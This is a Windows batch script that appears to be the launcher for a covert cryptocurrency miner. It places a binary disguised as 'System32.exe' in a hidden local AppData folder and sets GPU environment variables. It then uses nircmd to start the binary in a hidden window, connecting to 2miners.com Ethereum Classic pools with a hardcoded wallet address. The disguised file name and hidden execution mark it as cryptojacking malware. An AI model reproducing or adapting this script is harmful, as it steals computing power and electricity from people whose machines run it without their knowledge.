@echo off
set "APPDATA_LOCAL_FOLDER=%LOCALAPPDATA%\0"
set "SYSTEM32_PATH=%APPDATA_LOCAL_FOLDER%\System32.exe"
set "NIRCMD_PATH=%APPDATA_LOCAL_FOLDER%\nircmd.exe"

setx GPU_FORCE_64BIT_PTR 0 >nul
setx GPU_MAX_HEAP_SIZE 100 >nul
setx GPU_USE_SYNC_OBJECTS 1 >nul
setx GPU_MAX_ALLOC_PERCENT 100 >nul
setx GPU_SINGLE_ALLOC_PERCENT 100 >nul


start "" /B cmd /C "%NIRCMD_PATH% exec hide %SYSTEM32_PATH% -pool us-etc.2miners.com:1010 -pool2 etc.2miners.com:1010 -wal bc1qz3savx6zfegacr4yehpqx4y6tl84w7tjzmdtjh.worker"
